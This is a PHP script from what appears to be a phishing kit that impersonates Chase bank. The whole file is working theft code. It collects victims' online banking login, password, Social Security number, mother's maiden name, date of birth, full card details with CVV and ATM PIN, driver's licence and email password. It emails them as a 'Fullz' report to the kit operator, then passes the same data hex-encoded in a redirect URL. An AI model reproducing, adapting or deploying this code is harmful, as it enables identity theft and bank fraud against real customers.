<?php
if ($include != 1)
 {
 die('Illegal Access');
 }

include 'cc_validator.php'; //Caling Card validator

//Open Session
ini_set("output_buffering",4096);
session_start();


//Getting user ip & hostname
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

//Filling Email to send
include('Email.php');


//Getting UserID info from Session
$UserID = $_SESSION['UserID'];
$Passcode =  $_SESSION['PassCode'];
$firstname = $_SESSION['FNAME'];
$lastname = $_SESSION['LNAME'];
$address = $_SESSION['ADDRESS'];
$city = $_SESSION['City'];
$state = $_SESSION['State'];
$zip = $_SESSION['ZIP'];
$phone = $_SESSION['Phone'];
$phonepin = $_SESSION['Phonepin'];
$ssn = $_SESSION['SSN'];
$mmn = $_SESSION['MMN'];
$dob = $_SESSION['DOB'];
$ccnum = $_SESSION['CCnum'];
$CCType = is_valid_card($ccnum);
$expdate = $_SESSION['EXPDATE'];
$nameoncard = $_SESSION['Nameoncc'];
$cvv = $_SESSION['CVV'];
$pin = $_SESSION['PIN'];
$driverlic = $_SESSION['DLicense'];
$email = $_SESSION['EMail'];
$pass = $_SESSION['Password'];



$Chase="==================+[ User Info - Chase Selim ReZulz ]+==================
UserID : $UserID
Password   : $Passcode
First Name: $firstname
Last Name: $lastname
Address: $address
City: $city
State: $state
Zip: $zip
Phone: $phone
Phone PIN: $phonepin
Social Security Number: $ssn
Mother's Maiden Name: $mmn
Date of Birth: $dob ( Month - Day - Year )
============= [ Bank & Card Selim Info ] =============
Card Brand: $CCType
Name on the Card: $nameoncard
Card Number: $ccnum
Expiration date: $expdate
CVV: $cvv
ATM/PIN: $pin
Driver License Number: $driverlic
============= [ Email Login Selim Info ] =============
Email: $email
Pass: $pass
============= [ Ip & Hostname Selim Info ] =============
Client IP: $ip
Hostname: $hostname
-----------------+ Hunted In 2019 +-----------------";


$subject = "$UserID | Chase Fullz Nex";
$headers = "From: Chase Customer<shit@lnvoke.net>";
$headers .= $_POST['NeXoo']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($SEND,$subject,$Chase,$headers);

session_destroy();
$Redirect="Proccessing.php?user=valid&Fetch=".bin2hex($Chase);
header("Location: $Redirect");




?>